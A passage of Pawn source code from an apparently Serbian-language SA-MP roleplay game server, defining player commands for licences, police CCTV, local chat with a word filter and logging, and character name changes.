	strcat( DialogStrgEx, ""col_crvena"MOBILE | "col_white"/call (/p)ickup /hangup /sms /smsad\n" );
	strcat( DialogStrgEx, ""col_crvena"ANIM | "col_white"/animacije\n\n" );
    strcat( DialogStrgEx, ""col_crvena"SKILL SYSTEM | "col_white"/skills /upgradeskill /skillshelp\n" );

    strcat( DialogStrgEx, ""col_crvena"ACHIVEMENTS | "col_white"/achivements\n" );
    strcat( DialogStrgEx, ""col_crvena"AIRDROP | "col_white"/calldrop /airdrop\n" );
    strcat( DialogStrgEx, ""col_crvena"AIRSTRIKE | "col_white"/airstrike\n");
    strcat( DialogStrgEx, ""col_crvena"KOMBI PD | "col_white"/kombilokacija /kombigps /ugasikombigps /predajnovac\n\n" );

	if( PlayerInfo[ playerid ][ xSkriptaRank ] == 4 ) {
	    strcat( DialogStrgEx, ""col_crvena"V. LIDERA | /makeleader /smenilidera /spisakclanova /offizbaciclana\n" );
		strcat( DialogStrgEx, ""col_crvena"V. LIDERA | /skiniorgkaznu /ocistislot /izbaciclana /ubaciclana\n" ); }
	if( PlayerInfo[ playerid ][ xSkriptaRank ] == 5 ) {
		strcat( DialogStrgEx, ""col_crvena"V. PROMOTERA | /makepromoter /smenipromotera /dovedisvepromotere\n" ); }
	if( PlayerInfo[ playerid ][ xPosao ] == POSAO_KOSAC ) {
	    strcat( DialogStrgEx, ""col_crvena"POSAO | "col_white"/posao /uniforma /prekiniposao \n" ); }
    else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_RUDAR ) {
	    strcat( DialogStrgEx, ""col_crvena"POSAO | "col_white"/posao /uniforma /prekiniposao \n" ); }
	else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_DILER ) {
	    strcat( DialogStrgEx, ""col_crvena"POSAO | "col_white"/posadidrogu /uberidrogu /ukradidrogu /kupisemedroge /preradidrogu /dilerhelp \n" ); }
    else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_DELIVERY ) {
        strcat( DialogStrgEx, ""col_crvena"POSAO | "col_white"/loadshipment \n" ); }
	else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_VOJNIK ) {
	    strcat( DialogStrgEx, ""col_crvena"POSAO | "col_white"/vojnikoprema /vojnikmisije \n" ); }

    if(PlayerInfo[playerid][xNaftaID] != -1) {
        strcat( DialogStrgEx, ""col_crvena"NAFTNA PLATFORMA | "col_white"/platforma\n");
    }
    if(PlayerInfo[playerid][xWorkShopGarage] != -1) {
        strcat( DialogStrgEx, ""col_crvena"RADIONICA | "col_white"/workshop /kupidelove\n");
    }
    if(PlayerInfo[playerid][xWorkShopID] != -1) {
        strcat( DialogStrgEx, ""col_crvena"BITCOIN WORKSHOP | "col_white"/btcserver /btcprodaja\n");
    }
	
    if( GetFactionType( playerid ) == ORG_TIP_PD ) {
	    strcat( DialogStrgEx, ""col_crvena"ORGA | "col_white"/orghelp /prisonhelp /togfr /togd\n" ); }
    else if( GetFactionType( playerid ) == ORG_TIP_MD ) {
        strcat( DialogStrgEx, ""col_crvena"ORGA | "col_white"/f /d /mduty /medicine /recover /muniform /dajinekciju /nadji /togfr /togd\n" ); }
    else if( GetFactionType( playerid ) == ORG_TIP_CNN ) {
        strcat( DialogStrgEx, ""col_crvena"ORGA | "col_white"/f /vesti /live /newsstats /togfr \n" ); }
    else if( GetFactionType( playerid ) == ORG_TIP_ELEK ) {
        strcat( DialogStrgEx, ""col_crvena"ORGA | "col_white"/f /electric /clanovi /togfr \n" ); }
    else if( GetFactionType( playerid ) == ORG_TIP_TAXI ) {
        strcat( DialogStrgEx, ""col_crvena"ORGA | "col_white"/f /taxi /clanovi /togfr\n" ); }
    else if( GetFactionType( playerid ) == ORG_TIP_HITM ) {
        strcat( DialogStrgEx, ""col_crvena"ORGA | "col_white"/f /hitman /lociraj /clanovi /togfr\n" ); }
	else {
	    strcat( DialogStrgEx, ""col_crvena"ORGA | "col_white"/f /clanovi /togfr\n" ); }
	if( PlayerInfo[ playerid ][ xLider ] != 0 ) {
	    strcat( DialogStrgEx, ""col_crvena"LEADER | "col_white"/lider(sve opcije lidera)\n" ); }
    if( PlayerInfo[ playerid ][ xPromoter ] >= 1 ) {
        strcat( DialogStrgEx, ""col_crvena"PROMOTER | "col_white"/port /g /pc\n" ); }
	strcat( DialogStrgEx, ""col_crvena"OSTALO | "col_white"/otkaz /prihvati /odustani /fill /upali /ugasi /face /head /naocare /napustiorg /svetla /music /izadjiizdm\n" );
	strcat( DialogStrgEx, ""col_crvena"OSTALO | "col_white"/uzmicigaretu /torba /exit /izmeni /baci /droga /illegal /imovina /namestaj /platikauciju /ad /kaciga /trazi\n" );
	strcat( DialogStrgEx, ""col_crvena"OSTALO | "col_white"/hauba /gepek /lek /time /maskon /maskoff /pokazidozvole /dozvole /dropgun /pickupgun /lideri /organizacije\n" );
    strcat( DialogStrgEx, ""col_crvena"OSTALO | "col_white"/rukovanje /knock /windows /eject /daj /toganimchat /tognews /lock /pojas /unrent /gps /gpsoff /togphone /razbijlisice\n" );
    strcat( DialogStrgEx, ""col_crvena"OSTALO | "col_white"/rentroom /unrentroom\n" );
	strcat( DialogStrgEx, ""col_crvena"POMOC | "col_white"/ranac /putgun /garazahelp /vozilohelp /ah /hhelp /viphelp /pljackahelp /izazovinatrku /udjinadm /lottohelp /casehelp" );
	SPD( playerid, dialog_HELP, DSMSG, D_NASLOV, DialogStrgEx, "Potvrdi", "" );
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	return 1;
}
alias:help("komande");

CMD:pokazidozvole( playerid, params[] ) {
    new playerID;
    if( sscanf( params, "u", playerID ) ) return SendUsageMessage( playerid, "/pokazidozvole [ ID/Deo Imena ]");
	if( IsPlayerConnected( playerID ) ) {
		if( playerID != INVALID_PLAYER_ID ) {
		    if( IsPlayerNearPlayer( 8.0, playerid, playerID ) ) {
			    if( playerid == playerID ) return SendErrorMessage( playerid, "Ne mozes pokazati license samom sebi, koristi /dozvole!");
			    new string[ 64], text1[20], text2[20], text3[20], text4[20], text5[20], text6[20], text7[20];

				if( PlayerInfo[ playerid ][ xVozacka ] > 0 ) { text1 = "Da"; } else { text1 = "Ne"; }
                if( PlayerInfo[ playerid ][ xMotorska ] > 0 ) { text4 = "Da"; } else { text4 = "Ne"; }
				if( PlayerInfo[ playerid ][ xKamionskaC1 ] > 0 ) { text2 = "Da"; } else { text2 = "Ne"; }
		        if( PlayerInfo[ playerid ][ xKamionskaC2 ] > 0 ) { text3 = "Da"; } else { text3 = "Ne"; }
		        if( PlayerInfo[ playerid ][ xKamionskaC3 ] > 0 ) { text5 = "Da"; } else { text5 = "Ne"; }
		        if( PlayerInfo[ playerid ][ xBrodska ] > 0 ) { text6 = "Da"; } else { text6 = "Ne"; }
		        if( PlayerInfo[ playerid ][ xLetelica ] > 0 ) { text7 = "Da"; } else { text7 = "Ne"; }

                format(string, sizeof(string),""col_crvena"Ime: "col_white"%s", ImeIgraca( playerid ) );
                format(DialogStrgEx, sizeof(DialogStrgEx),""col_crvena"Dozvola za motor[A]: "col_white"%s\n"col_crvena"Dozvola za auto[B]: "col_white"%s\n"col_crvena"Dozvola za kombi[C1]: "col_white"%s\n"col_crvena"Dozvola za kamion[C2]: "col_white"%s\n"col_crvena"Dozvola za kamion sa prikolicom[C3]: "col_white"%s\n"col_crvena"Dozvola za brod[D]: "col_white"%s\n"col_crvena"Dozvola za letelicu[F]: "col_white"%s",text4,text1,text2,text3,text5,text6,text7);
				SPD( playerID, 0, DSMSG, string, DialogStrgEx, "Potvrdi", "" );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));

                format( globalstring, sizeof( globalstring ), "* %s vadi dozvole iz dzepa i daje ih %s", ImeIgraca( playerid ), ImeIgraca(playerID) );
                PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );

			} else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
		}
	} else SendErrorMessage( playerid, "Taj igrac nije online !");
    return 1;
}

CMD:dozvole( playerid, params[] ) {
	new string[ 64], text1[20], text2[20], text3[20], text4[20], text5[20], text6[20], text7[20];

	if( PlayerInfo[ playerid ][ xVozacka ] > 0 ) { text1 = "Da"; } else { text1 = "Ne"; }
	if( PlayerInfo[ playerid ][ xMotorska ] > 0 ) { text4 = "Da"; } else { text4 = "Ne"; }
	if( PlayerInfo[ playerid ][ xKamionskaC1 ] > 0 ) { text2 = "Da"; } else { text2 = "Ne"; }
	if( PlayerInfo[ playerid ][ xKamionskaC2 ] > 0 ) { text3 = "Da"; } else { text3 = "Ne"; }
	if( PlayerInfo[ playerid ][ xKamionskaC3 ] > 0 ) { text5 = "Da"; } else { text5 = "Ne"; }
	if( PlayerInfo[ playerid ][ xBrodska ] > 0 ) { text6 = "Da"; } else { text6 = "Ne"; }
	if( PlayerInfo[ playerid ][ xLetelica ] > 0 ) { text7 = "Da"; } else { text7 = "Ne"; }

	format(string, sizeof(string),""col_crvena"Ime: "col_white"%s", ImeIgraca( playerid ) );
	format(DialogStrgEx, sizeof(DialogStrgEx),""col_crvena"Dozvola za motor[A]: "col_white"%s\n"col_crvena"Dozvola za auto[B]: "col_white"%s\n"col_crvena"Dozvola za kombi[C1]: "col_white"%s\n"col_crvena"Dozvola za kamion[C2]: "col_white"%s\n"col_crvena"Dozvola za kamion sa prikolicom[C3]: "col_white"%s\n"col_crvena"Dozvola za brod[D]: "col_white"%s\n"col_crvena"Dozvola za letelicu[F]: "col_white"%s",text4,text1,text2,text3,text5,text6,text7);
	SPD( playerid, 0, DSMSG, string, DialogStrgEx, "Potvrdi", "" );
	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
    return 1;
}

CMD:cctv( playerid, params[] ) {
    if( GetFactionType( playerid ) == ORG_TIP_PD ) {
    
        if( PlayerInfo[ playerid ][ xZatvor ] > 0 ) return SendErrorMessage( playerid, "Ne mozes kamere dok si u zatvoru." );
        if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
		if( inOrgInt[ playerid ] != PlayerInfo[ playerid ][ xClan ] ) return SendErrorMessage( playerid, "Morate biti u interijeru vase organizacije." );

		SPD( playerid, dialog_CCTV, DSL, "Izaberi kameru", "Spoljasnost banke\nUnutrasnjost banke 1\nUnutrasnjost banke 2\nUnutrasnjost banke 3\nUnutrasnjost banke 4", D_ODABERI, D_ODUSTANI );
       	TogglePlayerControllable( playerid, false );
       	WatchingTV{ playerid } = 1;
       	SendInfoMessage( playerid, "Da ugasis kamere ukucaj /ugasikamere." );
	} else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu!" );
	return 1;
}

CMD:ugasikamere( playerid, params[] ) {
    if( GetFactionType( playerid ) == ORG_TIP_PD ) {
        if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
        if( WatchingTV{ playerid } == 1 ) {
		    new id = PlayerInfo[ playerid ][ xClan ];
		    Novi_SetPlayerPos( playerid, OI[ id ][ oPozIntX ], OI[ id ][ oPozIntY ], OI[ id ][ oPozIntZ ] );
		  	GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
		    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
		  	SetCameraBehindPlayer( playerid );
			TogglePlayerControllable( playerid, false );
		   	SetPlayerInterior( playerid, OI[ id ][ oInt ] );
			SetPlayerVirtualWorld( playerid, OI[ id ][ oVw ] );
		    WatchingTV{ playerid } = 0;
		    SendInfoMessage( playerid, "Ugasili ste sigurnosne kamere." );
		} else return SendErrorMessage( playerid, "Ne mozes ugasiti kamere koje nisi upalio!" );
	} else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu!" );
	return 1;
}

CMD:orghelp( playerid, params[] ) {
	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	if( GetFactionType( playerid ) == ORG_TIP_PD ) {
		strcat( DialogStrgEx, ""col_crvena"Clan | "col_white"/duty /r /alcotest /computer /uhapsi /cuff /uncuff /pu /cctv /ugasikamere\n" );
        strcat( DialogStrgEx, ""col_crvena"Clan | "col_white"/tazer /m /wanted /su /rb /rrb /removeall /bk /bkc /govrepair /undercover /pdslap\n" );
        strcat( DialogStrgEx, ""col_crvena"Clan | "col_white"/ram /frisk /take /d /ticket /orgstats /siren /gov /pokaziznacku /clear /suspend\n" );
        strcat( DialogStrgEx, ""col_crvena"Clan | "col_white"/dosije /removearm /pdoprema  /vuci /pusti /proveripojas /carsign /lociraj\n" );
		strcat( DialogStrgEx, ""col_crvena"Clan | "col_white"/narcotest /narcoresults /unistidrogu /destroygun /srusibvrata /namestibvrata\n" );
        strcat( DialogStrgEx, ""col_crvena"Clan | "col_white"/postaviradar /flash\n" );
		strcat( DialogStrgEx, ""col_crvena"Lider | "col_white"/lider" );
		SPD( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "Potvrdi", "" );
    	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	} else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu!" );
	return 1;
}

CMD:unistidrogu( playerid, params[] ) {
	if( GetFactionType( playerid ) != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
	if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");

	new found, plantid;
	for( new i = 1; i < MAX_PLANTS; i++) {
		if( IsPlayerInRangeOfPoint( playerid, 5.0, DrogaStab[ i ][ Plantx ], DrogaStab[ i ][ Planty ], DrogaStab[ i ][ Plantz ] ) ) {
			plantid = i;
			found = 1;
			break;
		}
		else
			continue;
	}
	if( found == 0 ) return SendErrorMessage( playerid, "Niste blizu posadjene stabiljke.");

	DrogaStab[ plantid ][ Plantx ] = 0;
	DrogaStab[ plantid ][ Planty ] = 0;
	DrogaStab[ plantid ][ Plantz ] = 0;
	DrogaStab[ plantid ][ wType ] = 0;
	DrogaStab[ plantid ][ wPlanted ] = 0;
	DrogaStab[ plantid ][ wHoursPassed ] = 0;
	strmid( DrogaStab[ plantid ][ wOwner ], "Niko", 0, strlen( "Niko" ), 255);
	DrogaStab[ plantid ][ wViwo ] = 0;
	DestroyDynamicObject( DrogaStab[ plantid ][ wObjectID ] );
	
	SendInfoMessage( playerid, "Unistio si posadjenu drogu." );
		
	return 1;
}

CMD:clear( playerid, params[] ) {
	if( GetFactionType( playerid ) != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
	if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");

	new id;
	if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/clear [ ID/Deo imena ] ");
    if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID Korisnika");

	PlayerInfo[ id ][ xWanted ] = 0;
   	Novi_SetPlayerWantedLevel( id, PlayerInfo[ id ][ xWanted ] );
    strmid( ZlocinInfo[ id ][zPrijavio], "Nema", 0, strlen("Nema"), 255);
	strmid( ZlocinInfo[ id ][zPocinio], "Nema", 0, strlen("Nema"), 255);
	strmid( ZlocinInfo[ id ][zZlocin], "Nema", 0, strlen("Nema"), 255);
    SendClientMessageEx( playerid, BELA, "Obrisali ste dosije gradjaninu %s.", ImeIgraca( id ) );
    
    format( globalstring, sizeof( globalstring ), "| CLEARWL | %s je ocistio WL igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
	AdminPoruka( SVETLOCRVENA, globalstring );
	
	format( globalstring, sizeof globalstring, "| CLEARWL | %s je ocistio WL igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
	OrgPorukaLeader( PlayerInfo[ playerid ][ xClan ], 0xD2CFCFFF, globalstring );
	return 1;
}

CMD:me( playerid, params[] ) {
	new text[ 128 ], string[ 234 ];
	if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/me [Akcija]" );

	for( new b = 0; b < sizeof( ZabranjeneReci ); b++) {
        if( strfind( text, ZabranjeneReci[ b ], true ) != -1 ) {
            format( globalstring, sizeof( globalstring ), "[!]%s[%d]: %s", ImeIgraca( playerid ), playerid, text );
       		AdminPoruka( 0x808000AA, globalstring );
       		return 1;
        }
	}

    if( PlayerInfo[ playerid ][ xMute ] != 0 ) {
        SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
        return 0;
    }

    if( Maskuse[ playerid ] == false )
		format( string, sizeof( string ), "* %s %s.", ImeIgraca( playerid ), text );
	else
		format( string, sizeof( string ), "* Maska_%d %s", PlayerInfo[ playerid ][ xMaskID ], text );
	PorukaRadius( 30.0, playerid, string, LJUBICASTA );
	return true;
}

CMD:attempt( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xMute ] != 0) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
	if( isnull( params ) ) return SendUsageMessage( playerid, "/attempt [ akcija ]");
	new succeed = 1 + random(2);
	if( succeed == 1 ) {
 		if( Maskuse[ playerid ] == true )
			format( globalstring, sizeof( globalstring ), "Maska_%d pokusava %s i uspjeva", PlayerInfo[ playerid ][ xMaskID ], params );
		else
  			format( globalstring, sizeof( globalstring ), "* %s pokusava %s i uspjeva.", ImeIgraca( playerid ), params );
     	PorukaRadius( 15.0, playerid, globalstring, ZELENA );
	}
	if(succeed == 2) {
 		if( Maskuse[ playerid ] == true)
			format( globalstring, sizeof( globalstring ), "Maska_%d pokusava %s i ne uspjeva", PlayerInfo[ playerid ][ xMaskID ], params );
		else
  			format( globalstring, sizeof( globalstring ), "* %s pokusava %s i ne uspjeva.", ImeIgraca( playerid ), params );
	    PorukaRadius( 15.0, playerid, globalstring, CRVENA );
	}
    return 1;
}

CMD:windows( playerid, params[] ) {
    if( IsPlayerInAnyVehicle( playerid ) ) {
		new carid = GetPlayerVehicleID( playerid );
  		if( IsACabrio( GetVehicleModel( carid ) ) ) return SendErrorMessage( playerid, "Vozilo nema prozora!");
        if( VehicleWindows[ GetPlayerVehicleID( playerid ) ] == 0 ) {
        	VehicleWindows[ GetPlayerVehicleID( playerid ) ] = 1;
        	if( Maskuse[ playerid ] == true )
        	    format( globalstring, sizeof( globalstring ), "Maska_%d spusta prozor.", PlayerInfo[ playerid ][ xMaskID ] );
        	else
            	format( globalstring, sizeof( globalstring ), "* %s spusta prozor.", ImeIgraca( playerid ) );
            PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
         }
         else if( VehicleWindows[ GetPlayerVehicleID( playerid ) ] == 1 ) {
         	VehicleWindows[ GetPlayerVehicleID( playerid ) ] = 0;
            if( Maskuse[ playerid ] == true )
        	    format( globalstring, sizeof( globalstring ), "Maska_%d podize prozor.", PlayerInfo[ playerid ][ xMaskID ] );
        	else
            	format( globalstring, sizeof( globalstring ), "* %s podize prozor.", ImeIgraca( playerid ) );
            PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
    	}
    }
    else SendErrorMessage( playerid, "Niste u vozilu!");
    return 1;
}

CMD:knock( playerid, params[] ) {
	new string[64];
    for( new i = 1; i < MAX_IMOVINA; i++)
	{
		if( IsPlayerInRangeOfPoint(playerid, 3, II[ i ][ iEnter ][ 0 ], II[ i ][  iEnter ][ 1 ], II[ i ][ iEnter ][ 2 ] ) ) {
  			format( string, sizeof( string ), "* %s kuca po vratima.", ImeIgraca( playerid ) );
			PorukaRadius( 30.0, playerid, string, LJUBICASTA );
			foreach( Player, p )
			{
   				if( IsPlayerInRangeOfPoint( p, 60, II[ i ][ iExit ][ 0 ], II[ i ][  iExit ][ 1 ], II[ i ][ iExit ][ 2 ] ) )
       				SCM( p, LJUBICASTA, "* Netko kuca po vratima.");
			}
		}
	}
	return 1;
}

CMD:c( playerid, params[] ) {
    // if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes koristiti komandu kad si cuffovan ili tazovan.");
	new text[ 128 ], string[ 234 ];
	if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/c [close chat]");
	if( PlayerInfo[ playerid ][ xMute ] != 0) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
	if( GetPVarInt(playerid, "ToggedAnim") == 0 )
    {
	    if(strlen(params) > 0 && strlen(params) < 10)
		    ApplyAnimation(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,500,1);
		else if(strlen(params) >= 10 && strlen(params) < 20)
		    ApplyAnimation(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,1000,1);
		else if(strlen(params) >= 20 && strlen(params) < 30)
		    ApplyAnimation(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,1500,1);
		else if(strlen(params) >= 30 && strlen(params) < 40)
		    ApplyAnimation(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,2000,1);
		else if(strlen(params) >= 40 && strlen(params) < 50)
		    ApplyAnimation(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,2500,1);
		else if(strlen(params) >= 50 && strlen(params) < 61)
		    ApplyAnimation(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,3000,1);
	}
	for( new b = 0; b < sizeof( ZabranjeneReci ); b++) {
        if( strfind( text, ZabranjeneReci[ b ], true ) != -1 ) {
            format( globalstring, sizeof( globalstring ), "[!]%s[%d]: %s", ImeIgraca( playerid ), playerid, text );
       		AdminPoruka( 0x808000AA, globalstring );
       		return 1;
        }
	}
  	if( IsPlayerInAnyVehicle( playerid ) )
  	{
		if( Maskuse[ playerid ] == true)
    		format( string, sizeof( string ), "Maska_%d kaze tiho (vozilo) : %s", PlayerInfo[ playerid ][ xMaskID ], text );
		else
            format( string, sizeof( string ), "%s kaze tiho (vozilo): %s", ImeIgraca( playerid ), text );
		PorukaRadius(3.0, playerid, string, 0xE6E6E6E6 );
	}
	else
	{
		if( Maskuse[ playerid ] == true)
    		format( string, sizeof( string ), "Maska_%d kaze tiho: %s", PlayerInfo[ playerid ][ xMaskID ], text );
		else
            format( string, sizeof( string ), "%s kaze tiho: %s", ImeIgraca( playerid ), text );
		PorukaRadius( 3.0, playerid, string, 0xE6E6E6E6 );
	}
	new string1[ 128 ];
	format( string1, sizeof( string1 ), "Igrac %s: %s", ImeIgraca( playerid ), text );
	LogSave( "Ostalo/LogCChat.log", string1 );
	return 1;
}

CMD:s( playerid, params[] ) {
	new text[ 128 ], string[ 234 ];
	if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/s [shout chat]");
	// if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes koristiti komandu kad si cuffovan ili tazovan.");
	if( PlayerInfo[ playerid ][ xMute ] != 0) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
    for( new b = 0; b < sizeof( ZabranjeneReci ); b++) {
        if( strfind( text, ZabranjeneReci[ b ], true ) != -1 ) {
            format( globalstring, sizeof( globalstring ), "[!]%s[%d]: %s", ImeIgraca( playerid ), playerid, text );
       		AdminPoruka( 0x808000AA, globalstring );
       		return 1;
        }
	}
	if( Maskuse[ playerid ] == false)
		format( string, sizeof( string ), "%s se dere: %s!!", ImeIgraca( playerid ), text);
	else
		format( string, sizeof( string ), "Maska_%d se dere: %s!!", PlayerInfo[ playerid ][ xMaskID ], text );
	PorukaRadius( 3.0, playerid, string, 0xE6E6E6E6);
	if( GetPVarInt( playerid, "ToggedAnim") == 0 ) {
    	if( strlen( params ) > 0 && strlen( params ) < 10 )
	    	ApplyAnimation( playerid, "PED", "IDLE_CHAT", 4.0, 0, 0, 0, 0, 500, 1 );
		else if( strlen( params ) >= 10 && strlen(params) < 20 )
		    ApplyAnimation( playerid, "PED", "IDLE_CHAT", 4.0, 0, 0, 0, 0, 1000, 1 );
		else if( strlen( params ) >= 20 && strlen(params) < 30 )
			ApplyAnimation( playerid, "PED", "IDLE_CHAT",4.0,0,0,0,0,1500,1 );
		else if( strlen( params ) >= 30 && strlen(params) < 40 )
			ApplyAnimation( playerid, "PED", "IDLE_CHAT",4.0,0,0,0,0,2000,1 );
		else if( strlen( params ) >= 40 && strlen(params) < 50 )
			ApplyAnimation( playerid, "PED","IDLE_CHAT",4.0,0,0,0,0,2500,1 );
		else if( strlen( params ) >= 50 && strlen(params) < 61 )
			ApplyAnimation(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,3000,1 );
	}
	new string1[ 128 ]; 
	format( string1, sizeof( string1 ), "Igrac %s: %s", ImeIgraca( playerid ), text );
	LogSave( "Ostalo/LogSChat.log", string1 );
	return 1;
}

CMD:w( playerid, params[] ) {
	new result[128], string[ 234 ], id;

    if( sscanf( params, "us[128]", id, result ) ) {
        SendUsageMessage( playerid, "/w [ ID/DeoImena ] [ text ]");
        return 1;
    }
    // if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes koristiti komandu kad si cuffovan ili tazovan.");
	if( PlayerInfo[ playerid ][ xMute ] != 0 ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
	if( IsPlayerConnected( id ) ) {
		if( IsPlayerNearPlayer( 2.0, playerid, id ) ) {
			if( id == playerid ) return SendErrorMessage( playerid, "Nisi valjda toliko lud da pricas sam sa sobom?");
			if( AdminDuty[ id ] ) return SendErrorMessage( playerid, "Ne mozes da sapnes Adminu ili suporteru na duty." );
			for( new b = 0; b < sizeof( ZabranjeneReci ); b++) {
		        if( strfind( result, ZabranjeneReci[ b ], true ) != -1 ) {
		            format( globalstring, sizeof( globalstring ), "[!]%s[%d]: %s", ImeIgraca( playerid ), playerid, result );
		       		AdminPoruka( 0x808000AA, globalstring );
		       		return 1;
		        }
			}
			if( Maskuse[ playerid ] == true) {
			    format( string, sizeof( string ), "Maska_%d sapuce %s", PlayerInfo[ playerid ][ xMaskID ], result );
				SCM( playerid,  SVETLOCRVENA, string );
				SCM( id, SVETLOCRVENA, string );
				format( string, sizeof( string ), "* Maska_%d sapuce nesto.", PlayerInfo[ playerid ][ xMaskID ] );
				PorukaRadius( 5.0, playerid, string, LJUBICASTA );
			}
			else {
				format( string, sizeof( string ), "%s sapuce %s", ImeIgraca( playerid ), result );
				SCM( playerid,  SVETLOCRVENA, string );
				SCM( id, SVETLOCRVENA, string );
				format( string, sizeof( string ), "* %s sapuce nesto.", ImeIgraca( playerid ) );
				PorukaRadius( 5.0, playerid, string, LJUBICASTA );
			}
			format( string, sizeof( string ), "|W|%s -> %s: %s", ImeIgraca( playerid ), ImeIgraca( id ), result );
			AdminWisper( 0xFFE4C4AA, string );
			new string1[ 128 ]; 
			format( string1, sizeof( string1 ), "Igrac %s: %s", ImeIgraca( playerid ), result );
			LogSave( "Ostalo/LogWChat.log", string1 );
			return 1;
		} else SendErrorMessage( playerid, "Previse ste udaljeni od tog igraca!");
	} else SendErrorMessage( playerid, "Taj igrac nije na serveru!");
	return 1;
}

CMD:changename( playerid, params[] ) {
	new novoime[32], newname[ 40 ];
	new year, month, day;

	if( sscanf( params, "s[32]", novoime)) return SendUsageMessage( playerid, "/changename [ Ime_Prezime ]");
	format( newname, sizeof( newname ), "Korisnici/%s.ini", novoime );

	if( GetPVarInt( playerid, "PlayerCanChangeName") != 1) return SendErrorMessage( playerid, "Nemate dopustenje od Admin-a da promenite ime i prezime svoga lika.");
	if( !IsValidRoleplayName( novoime ) ) return SendErrorMessage( playerid, "Nepravilan City format imena.");
	if( fexist( newname ) ) return SendErrorMessage( playerid, "Novo ime vec postoji u bazi podataka!" );

    SetPVarInt( playerid, "PlayerCanChangeName", 0);
	getdate(year, month, day);
    format( globalstring, sizeof( globalstring ), "*RENAME: %s je promenio ime u %s (%d-%d-%d)", ImeIgraca( playerid ), novoime, month, day, year );
    printf("%s",  globalstring );
    format( globalstring, sizeof( globalstring ), "RENAME: %s je promenio ime u %s.", ImeIgraca( playerid ), novoime );
	AdminPoruka( CRVENA, globalstring );

	SavePlayer( playerid );
	RenamePlayer( ImeIgraca( playerid ), novoime, playerid );

    SendInfoMessage( playerid, "Uspesno si promenio ime!" );
    format( globalstring, sizeof( globalstring ), "Prijavite se ponovno sa imenom: %s", novoime );
	Kickovanje( playerid, globalstring );
	return 1;
}

CMD:promeniime( playerid, params[] ) {

    if(!IsPlayerInRangeOfPoint(playerid, 3.0, -1872.7194,2675.4724,3.5904)) return SendErrorMessage(playerid, "Morate biti u salteru u Opstini!");

    if(GetPlayerMoney(playerid) < 15000000) return SendErrorMessage(playerid, "Nemas dovoljno novca! ($20.000.000)");

    new novoime[32], newname[ 40 ];
    new year, month, day;

    if( sscanf( params, "s[32]", novoime)) return SendUsageMessage( playerid, "/promeniime [ Ime_Prezime ]");
    format( newname, sizeof( newname ), "Korisnici/%s.ini", novoime );

    if( !IsValidRoleplayName( novoime ) ) return SendErrorMessage( playerid, "Nepravilan format imena. ( Ime_Prezime )");
    if( fexist( newname ) ) return SendErrorMessage( playerid, "Novo ime vec postoji u bazi podataka!" );

    DajIgracuNovac(playerid, -15000000);

    getdate(year, month, day);
    format( globalstring, sizeof( globalstring ), "*PROMENIIME: %s je promenio ime u %s (%d-%d-%d)", ImeIgraca( playerid ), novoime, month, day, year );
    printf("%s",  globalstring );
    format( globalstring, sizeof( globalstring ), "PROMENIIME: %s je promenio ime u %s.", ImeIgraca( playerid ), novoime );
    AdminPoruka( CRVENA, globalstring );

    SavePlayer( playerid );
    RenamePlayer( ImeIgraca( playerid ), novoime, playerid );

    SendInfoMessage( playerid, "Uspesno si promenio ime!" );
    format( globalstring, sizeof( globalstring ), "Prijavite se ponovno sa imenom: %s", novoime );
    Kickovanje( playerid, globalstring );
    return 1;
}

CMD:specijalnoime( playerid, params[] ) {

